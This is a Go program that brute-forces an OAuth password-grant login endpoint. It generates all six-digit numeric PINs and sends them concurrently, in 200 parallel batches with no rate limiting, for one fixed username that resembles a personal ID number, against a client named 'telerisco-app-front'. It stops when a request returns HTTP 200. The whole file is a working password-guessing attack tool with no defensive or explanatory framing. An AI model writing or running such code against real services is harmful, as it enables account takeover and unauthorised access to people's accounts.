package main

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

type User struct {
	Username string
	Password string
}

type ResponseBruteForce struct {
	Err        error
	StatusCode int
	Body       string
	User
}

var m sync.Mutex

func main() {
	start := time.Now().UnixMilli()
	pagesChannel := make(chan *[]string)
	responseChannel := make(chan ResponseBruteForce)

	totalElements := 1_000_000
	elementsPerPage := 5_000
	qtdPages := totalElements / elementsPerPage
	fmt.Println(qtdPages)

	pages := make([][]string, 0)
	fmt.Println(pages)

	for i := 0; i < qtdPages; i++ {
		start := i * elementsPerPage
		end := start + elementsPerPage
		if start == 0 {
			start++
		}
		if end == totalElements {
			end++
		}
		go populatePage(pagesChannel, start, end)
	}

	for i := 0; i < qtdPages; i++ {
		appendPasswords(&pages, <-pagesChannel)
	}

	fmt.Printf("Pages: %d\n", len(pages))
	totalSize := 0
	for i, page := range pages {
		pageSize := len(page)
		totalSize += pageSize
		fmt.Printf("Page '%d', size: %d\n", i, pageSize)
	}
	fmt.Printf("Total populated elements: %d\n", totalSize)
	fmt.Printf("Total time in millis: %d ms\n", time.Now().UnixMilli()-start)

	for _, page := range pages {
		username := "64735569073"
		go bruteForce(responseChannel, username, page)
	}

	readChannel(pages, responseChannel, start)
}

func readChannel(pages [][]string, responseChannel <-chan ResponseBruteForce, start int64) {
	count := 0
	for i := 0; i < len(pages); i++ {
		for j := 0; j < len(pages[i]); j++ {
			response := <-responseChannel
			count++
			if response.StatusCode == 200 {
				fmt.Printf("%v\n", response)
				end(count, start)
			} else {
				fmt.Printf("Username: %s, password: %s, StatusCode: %d,\nBody: %v, Error: %v\n\n",
					response.Username, response.Password, response.StatusCode, response.Body, response.Err)
			}
		}
	}
	fmt.Printf("Total elements verify: %d\n\n", count)
	fmt.Printf("Total time in minutes: %.3f m\n", float64(time.Now().UnixMilli()-start)/60_000)
}

func end(count int, start int64) {
	fmt.Printf("Total elements verify: %d\n\n", count)
	fmt.Printf("Total time in minutes: %.3f m\n", float64(time.Now().UnixMilli()-start)/60_000)
	syscall.Exit(0)
}

func populatePage(channel chan *[]string, start int, end int) {
	passwords := make([]string, 0)
	for ; start < end; start++ {
		passwords = append(passwords, fmt.Sprintf("%06d", start))
	}
	channel <- &passwords
}

func appendPasswords(pagePasswords *[][]string, passwords *[]string) {
	m.Lock()
	defer m.Unlock()
	*pagePasswords = append(*pagePasswords, *passwords)
}

func bruteForce(channel chan<- ResponseBruteForce, username string, passwords []string) {
	client := http.Client{Timeout: 3 * time.Minute}
	data := url.Values{}
	data.Set("username", username)
	data.Set("client_id", "telerisco-app-front")
	data.Set("grant_type", "password")
	for _, password := range passwords {
		data.Set("password", password)
		encodedData := data.Encode()
		endpoint := "someUrl"
		req, err := http.NewRequest("POST", endpoint, strings.NewReader(encodedData))
		if err != nil {
			channel <- ResponseBruteForce{
				Err:        err,
				StatusCode: 500,
				Body:       "",
				User: User{
					Username: username,
					Password: password,
				},
			}
			continue
		}
		req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
		req.Header.Add("Content-Length", strconv.Itoa(len(encodedData)))
		response := callEndpoint(username, password, client, req)
		//time.Sleep(1 * time.Millisecond)
		channel <- response
		if response.StatusCode == 200 {
			break
		}
	}
}

func callEndpoint(username string, password string, client http.Client, req *http.Request) ResponseBruteForce {
	fmt.Printf("Request token: Username: %s, password: %s\n", username, password)
	start := time.Now().UnixMilli()
	response, err := client.Do(req)
	if err != nil {
		return ResponseBruteForce{
			Err:        err,
			StatusCode: 500,
			Body:       "",
			User: User{
				Username: username,
				Password: password,
			},
		}
	}
	defer func(Body io.ReadCloser) {
		err := Body.Close()
		fmt.Printf("Response token: Username: %s, password: %s, StatusCode: %d, time: %dms\n",
			username, password, response.StatusCode, time.Now().UnixMilli()-start)
		if err != nil {
			fmt.Printf("Error: %v\n", err)
		}
	}(response.Body)
	b, err := io.ReadAll(response.Body)
	if err != nil {
		return ResponseBruteForce{
			Err:        err,
			StatusCode: 500,
			Body:       "",
			User: User{
				Username: username,
				Password: password,
			},
		}
	}
	return ResponseBruteForce{
		Err:        nil,
		StatusCode: response.StatusCode,
		Body:       string(b),
		User: User{
			Username: username,
			Password: password,
		},
	}
}
